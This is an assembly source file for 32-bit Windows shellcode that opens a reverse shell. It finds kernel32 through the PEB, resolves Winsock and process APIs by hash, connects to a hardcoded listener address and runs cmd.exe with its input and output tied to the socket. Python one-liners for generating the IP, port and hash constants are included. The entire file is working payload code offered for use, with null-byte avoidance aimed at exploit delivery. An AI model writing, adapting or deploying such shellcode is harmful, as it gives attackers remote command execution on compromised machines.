; position independent non-NULL cmd.exe reverse shellcode with ExitThread - 279 bytes
BITS 32
section .text
global _start


_SHIFT equ 0x11    ; programmable hash shift to help account for bad bytes in hashes
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; IP used to receive remove connection (change _IP):
;   python3 -c "_IP='192.168.119.120';_L=[int(x) for x in _IP.split('.')[::-1]];print(f'0x{_L[0]:02X}{_L[1]:02X}{_L[2]:02X}{_L[3]:02X}')"
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
_IP equ 0x9231A8C0 ; 192.168.49.146
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; PORT used to receive connection on remote machine (change _P):
;   python3 -c "_P=443;print(f'0x{_P&0xFF:02X}{(_P&0xFF00)>>8:02X}')"
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
_PORT equ 0x391B   ; 6969
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; function hashes used by call_function (_F is function name and _S is the _SHIFT value above):
;   python3 -c "_F='LoadLibraryA';_S=0x11;_H=0;[globals().update(_H=((0xFFFFFFFF&((_H>>_S)|(_H<<(32-_S))))+ord(c))) for c in _F];print('0x'+f'{_H:08X}')"
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
_LoadLibraryA   equ 0xC40C8266 
_WSAStartup     equ 0xAF4D0E14 
_WSASocketA     equ 0x0F4B85E2 
_WSAConnect     equ 0x7F436615 
_CreateProcessA equ 0x3CAA811E 
_ExitThread     equ 0x08425506 


_start:
  jmp  push_pic_address            ; get PIC offset of call_function on stack
pop_pic_address:
  pop  ebp                         ; EBP = PIC address of call_function
  jmp  main                        ; jump to start of shellcode
push_pic_address:
  call pop_pic_address             ; EIP pushed onto stack is PIC address of call_function
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; finds & calls a target function in a DLL:
; - EDI = DLL base & EDX = function hash 
; - assumes stack is prepared for call to target function
; - returns EAX = result of called function & EDX = NULL 
; - only EDI/ESI/EBP are preserved after call (stack unchanged)
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
call_function:
  pushad                           ; save caller register state
  mov  eax, [edi + 0x3C]           ; EBP = DOS_header.e_lfanew (RVA of PE header)
  mov  ebx, [edi + eax + 0x78]     ; EBX = ImageOptional_header.DataDirectory[0].VirtualAddress (RVA of ExportDirectory)
  add  ebx, edi                    ; EBX = virtual address of Export Directory
  push ebx                         ; save virtual address of Export Directory onto the stack
  mov  ecx, [ebx + 0x18]           ; ECX = ImageExportDirectory.NumberOfNames (number of exported *named* functions from export table)
  mov  ebx, [ebx + 0x20]           ; EBX = ImageExportDirectory.AddressOfNames (RVA of name pointer table)
  add  ebx, edi                    ; EBX = virtual address of ImageExportDirectory.AddressOfNames array table
  xchg ebp, edx                    ; EBP = target hash to search for during loop
.next_function:                    ; loop through AddressOfNames pointer table backwards
  dec  ecx                         ; ECX = ECX  - 1 (go to the next name pointer index)
  mov  esi, [ebx + (ecx * 0x04)]   ; ESI = RVA of next pointer from name table (entries are 4 bytes long)
  add  esi, edi                    ; ESI = virtual address of next pointer from name table 
  xor  eax, eax                    ; EAX = NULL
  cdq                              ; EDX = NULL
  cld                              ; clear data direction flag in status register
.compute_hash:                     ; compute 32 bit hash of function name
  lodsb                            ; EAX = ImageExportDirectory.AddressOfNames[ECX][i] (load a byte from string pointer in ESI into AL)
  test al, al                      ; check for NULL string terminator
  jz   call_function.compare_hash  ; if done hashing function name string, compare the hash
  ror  edx, _SHIFT                 ; EDX = EDX rotated HASH_SHIFT bits to the right
  add  edx, eax                    ; add to EDX the current byte from the target string
  jmp  call_function.compute_hash  ; continue loop to calculate the hash of the current function name string
.compare_hash:                     ; reached once hash as been calculated on the full function name string
  cmp  ebp, edx                    ; check if target hash in EBP == computed hash in EDX
  jnz  call_function.next_function ; go to the next function pointer in ImageExportDirectory.AddressOfNames
  pop  ebx                         ; pull saved virtual address of Export Directory from the stack
  mov  esi, [ebx + 0x24]           ; ESI = ImageExportDirectory.AddressOfNameOrdinals (RVA of name ordinal table)
  add  esi, edi                    ; ESI = virtual address of ImageExportDirectory.AddressOfNameOrdinals
  mov  ax,  [esi + (ecx * 0x02)]   ; EAX = ImageExportDirectory.AddressOfNameOrdinals[ECX] (ordinal number of the target function (entries are 2 bytes long))
  mov  esi, [ebx + 0x1C]           ; ESI = ImageExportDirectory.AddressOfFunctions (RVA of function address table)
  add  esi, edi                    ; ESI = virtual address of ImageExportDirectory.AddressOfFunctions
  mov  eax, [esi + (eax * 0x04)]   ; EAX = ImageExportDirectory.AddressOfFunctions[EAX] (RVA of the target function)
  add  eax, edi                    ; EAX = virtual address of the target function
  mov  [esp + 0x1C], eax           ; overwrite saved version of EAX from pushad on the stack
  popad                            ; restore caller register state (EAX now holds target function to call)
  pop  ebx                         ; EBX = caller return address off the stack (callee saved register so preserved through function call)
  call eax                         ; call target function with stack as caller prepared for target function
  xor  edx, edx                    ; EDX = NULL (for caller to use in common NULL arithmetic operations)
  jmp  ebx                         ; return to caller with EAX holding the same result from function call
main:                              ; shellcode entry point
  xor  eax, eax                    ; EAX = NULL
  mov  ecx, [fs:eax + 0x30]        ; ECX = TEB->PEB
  mov  ecx, [ecx + 0x0C]           ; ECX = PEB->Ldr
  mov  ecx, [ecx + 0x1C]           ; ECX = PEB->Ldr->InInitializationOrderModuleList[0]
find_kernel32:                     ; loop to find kernel32.dll in the PEB's InInitializationOrderModuleList
  mov  edi, [ecx + 0x08]           ; EDI = PEB->Ldr->InInitializationOrderModuleList[x].DllBase
  mov  esi, [ecx + 0x20]           ; ESI = PEB->Ldr->InInitializationOrderModuleList[x].BaseDllName.Buffer
  mov  ecx, [ecx]                  ; ECX = PEB->Ldr->InInitializationOrderModuleList[x].Flink
  cmp  ax, [esi + (12 * 2)]        ; check if UNICODE BaseDllName[12] == NULL since strlen("kernel32.dll") == 12
  jne  find_kernel32               ; keep looking if not found
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; LoadLibraryA("ws2_32")
; https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibrarya
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  mov  ax, 0x3233                  ; EAX = b'\x00\x0032'
  push eax                         ; push "32" end of "ws2_32" with 2 NULL bytes
  push 0x5f327377                  ; push "_2sw" (ESP points to "ws2_32" string now)
  push esp                         ; push argument #1 (pointer to "ws2_32" string)
  mov  edx, _LoadLibraryA          ; EDX = hash(LoadLibraryA)
  call ebp                         ; call LoadLibraryA 
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; WSAStartup(0x0202, &WSADATA)
; https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~  
  mov  esi, edi                    ; ESI = base address of kernel32.dll
  xchg edi, eax                    ; EDI = base address of ws2_32.dll from LoadLibraryA("ws2_32.dll") call
  mov  ebx, esp                    ; EBX = pointer to top of the stack
  mov  dx, 0x590                   ; EDX = 1424 (must be 4 byte aligned to the stack)
  sub  ebx, edx                    ; EBX = ESP - 1424
  push ebx                         ; push argument #2 (address of WSADATA strucutre carved out of stack)
  mov  dx, 0x0202                  ; EDX = WSA version of 2.2
  push edx                         ; push argument #1 (WSA version)
  mov  edx, _WSAStartup            ; EDX = hash(WSAStartup)
  call ebp                         ; call WSAStartup (EAX = 0 as return value of successful call)
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
; https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasocketa
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  push eax                         ; push argument #6 (dwFlags = 0) 
  push eax                         ; push argument #5 (g = 0)
  push eax                         ; push argument #4 (lpProtocolInfo = NULL)
  mov  al, 0x06                    ; EAX = 0x06 = IPPROTO_TCP
  push eax                         ; push argument #3 (protocol = IPPROTO_TCP)
  sub  al, 0x05                    ; EAX = 0x01 = SOCK_STREAM
  push eax                         ; push argument #2 (type = SOCK_STREAM)
  inc  eax                         ; EAX = 0x02 = AF_INET
  push eax                         ; push argument #1 (af = AF_INET)
  mov  edx, _WSASocketA            ; EDX = hash(WSASocketA)
  call ebp                         ; call WSASocketA 
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; WSAConnect(socket, (struct sockaddr *), sizeof(struct sockaddr), NULL, NULL, NULL, NULL);
; https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  push edx                         ; sin_zero[4] to sin_zero[7] = NULL
  push edx                         ; sin_zero[0] to sin_zero[3] = NULL
  push _IP                         ; sin_addr.s_addr = inet_addr(_IP) 
  push word _PORT                  ; sin_port = htons(_PORT) 
  mov  dl, 0x02                    ; EDX = AF_INET = 0x02
  push word dx                     ; sin_family = AF_INET
  xor  edx, edx                    ; EDX = NULL
  mov  ecx, esp                    ; ECX = pointer to struct sockaddr on stack
  push eax                         ; save socket value from WSASocketA on stack before arguments to WSAConnect
  push edx                         ; push argument #7 (lpGQOS = NULL)
  push edx                         ; push argument #6 (lpSQOS = NULL)
  push edx                         ; push argument #5 (lpCalleeData = NULL)
  push edx                         ; push argument #4 (lpCallerData = NULL)
  push 0x10                        ; push argument #3 (sizeof(struct sockaddr) = 16)
  push ecx                         ; push argument #2 (struct sockaddr *)
  push eax                         ; push argument #1 (socket from call to WSASocketA above)
  mov  edx, _WSAConnect            ; EDX = hash(WSAConnect)
  call ebp                         ; call WSAConnect (EAX = 0 as return value of successful call)
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, 0, NULL, NULL, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
; https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  xchg edi, esi                    ; EDI = base address of kernel32.dll & ESI = base address of ws2_32.dll
  pop  ecx                         ; pull saved socket value off stack (Win32 uses stdcall so WSAConnect cleaned the stack of its arguments)
  push ecx                         ; push STARTUPINFOA.hStdError = socket
  push ecx                         ; push STARTUPINFOA.hStdOutput = socket
  push ecx                         ; push STARTUPINFOA.hStdInput = socket
  push eax                         ; push STARTUPINFOA.lpReserved2 = NULL
  push eax                         ; push STARTUPINFOA.cbReserved2 = NULL & STARTUPINFOA.wShowWindow = NULL
  mov  dl, 0xFF                    ; EDX = 0xFF
  inc  edx                         ; EDX = 0x100
  inc  edx                         ; EDX = 0x101 = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW)
  push edx                         ; push STARTUPINFOA.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW
  push 0x0A                        ; stage number of times to loop on stack
  pop  ecx                         ; ECX = 0x0A
memset:                            ; small loop for a 4 byte memset to 0 on stack
  push eax                         ; set following to NULL in STARTUPINFOA: dwFillAttribute, dwYCountChars, dwXCountChars, dwYSize, dwXSize, dwY, dwX, lpTitle, lpDesktop, lpReserved
  loop memset                      ; do this 0x0A times 
  mov  cl, 0x44                    ; stage sizeof(STARTUPINFOA)
  push ecx                         ; push STARTUPINFOA.cb = sizeof(STARTUPINFOA)
  mov  ebx, esp                    ; EBX = pointer to STARTUPINFOA on the stack
  mov  edx, 0xFF9B929C             ; EDX = ~"\x00dmc"
  not  edx                         ; EDX = "\x00dmc"
  push edx                         ; push "cmd\x00" string to the stack
  mov  edx, esp                    ; EDX = pointer to "cmd" string on stack
  mov  cx, 0x390                   ; ECX = 912 (must be 4 byte aligned to the stack)
  mov  esi, esp                    ; ESI = ESP
  sub  esi, ecx                    ; ESI = ESP - 912
  push esi                         ; push argument #10 (lpProcessInformation = LPPROCESS_INFORMATION)
  push ebx                         ; push argument #9 (lpStartupInfo = LPSTARTUPINFOA)
  push eax                         ; push argument #8 (lpCurrentDirectory = NULL)
  push eax                         ; push argument #7 (lpEnvironment = NULL)
  push eax                         ; push argument #6 (dwCreationFlags = NULL)
  inc  eax                         ; EAX = 0x01 = TRUE
  push eax                         ; push argument #5 (bInheritHandles = TRUE)
  dec  eax                         ; EAX = NULL
  push eax                         ; push argument #4 (lpThreadAttributes = NULL)
  push eax                         ; push argument #3 (lpProcessAttributes = NULL)
  push edx                         ; push argument #2 (lpCommandLine = "cmd")
  push eax                         ; push argument #1 (lpApplicationName = NULL)
  mov  edx, _CreateProcessA        ; EDX = hash(CreateProcessA)
  call ebp                         ; call CreateProcessA
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
; ExitThread(0);
; https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-exitthread
; ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
  push edx                         ; push argument #1 (dwExitCode = 0)
  mov  edx, _ExitThread            ; EDX = hash(ExitThread)
  call ebp                         ; ESI = address of ExitThread()
